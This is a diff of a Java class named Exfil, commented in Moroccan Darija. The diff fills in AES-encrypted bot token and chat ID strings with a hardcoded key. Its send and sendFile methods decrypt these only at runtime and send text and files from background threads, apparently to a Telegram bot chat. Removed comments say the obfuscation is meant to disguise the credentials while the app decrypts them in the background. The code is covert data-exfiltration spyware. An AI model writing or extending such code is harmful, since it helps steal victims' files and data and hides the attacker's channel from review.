@@ -14,15 +14,14 @@ import javax.crypto.spec.SecretKeySpec;
 
 public class Exfil {
     
-    // 1. Hna fin kayn l'Token w l'Chat ID m-encryptin (Makhdoum b AES-256)
-    // Had l'code kayban b7al chi chifra, walakin l'app kat-fokha f l'background.
-    private static final String ENC_TOKEN = "HNA_KTEb_L_TOKEN_M_ENCRYPTE";
-    private static final String ENC_CHAT_ID = "HNA_KTEb_L_CHAT_ID_M_ENCRYPTE";
+    // L'Token w l'Chat ID m-encryptin (Makhdoum b AES-256)
+    private static final String ENC_TOKEN = "GiAyDOTdgj6JrceD11JY4qZzjqbs3OvGCxJPsu+GIeExqfEXcMu0WE9YEr63OdyNwMiuMbVEQ8pwh6dcQJjlzxHq/q7vO9upUQ1C0saW9CZCPBL7iFTsb1no";
+    private static final String ENC_CHAT_ID = "hE73YR/q2eyjwkQt3oIa9mxzjwhSz1urMMI9hSWm8aEJDEJmRIKf16ZgPgGpktxWdhpJ7UrX";
     
-    // Had l'clé hiya li kat-fok l'chifra (Khelliha mkhbeya)
-    private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; // Khassha tkoun 32 byte
+    // L'clé dyal l'decryption (Khassha tkoun 32 byte)
+    private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; 
 
-    // 2. Fonction li kat-fok l'chifra
+    // Fonction li kat-fok l'chifra f l'memory
     private static String decrypt(String encryptedText) {
         try {
             byte[] keyBytes = SECRET_KEY.getBytes("UTF-8");
@@ -37,11 +36,10 @@ public class Exfil {
         }
     }
 
-    // 3. Send Text
+    // 1. Send Text
     public static void send(String text) {
         new Thread(() -> {
             try {
-                // Kan-fokow l'chifra hna f l'wa9t li kan-sifto
                 String botToken = decrypt(ENC_TOKEN);
                 String chatId = decrypt(ENC_CHAT_ID);
 
@@ -59,11 +57,10 @@ public class Exfil {
         }).start();
     }
     
-    // 4. Send File
+    // 2. Send File
     public static void sendFile(String filePath, String type, String caption) {
         new Thread(() -> {
             try {
-                // Kan-fokow l'chifra hna f l'wa9t li kan-sifto
                 String botToken = decrypt(ENC_TOKEN);
                 String chatId = decrypt(ENC_CHAT_ID);
 
@@ -96,4 +93,4 @@ public class Exfil {
             } catch (Exception e) { e.printStackTrace(); }
         }).start();
     }
-        }
+            }
